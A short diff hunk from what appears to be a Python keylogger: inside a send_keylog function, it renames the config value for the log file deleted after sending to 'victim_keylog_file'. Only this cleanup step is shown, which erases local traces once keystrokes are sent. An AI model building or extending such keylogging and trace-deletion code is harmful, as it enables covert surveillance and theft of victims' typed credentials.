@@ -54,7 +54,7 @@ def send_keylog(log_file):
     print("Termination request sent.\n")
 
     # Removing log file after sending
-    os.remove(config.keylog_file)
+    os.remove(config.victim_keylog_file)
 
 
 def main():
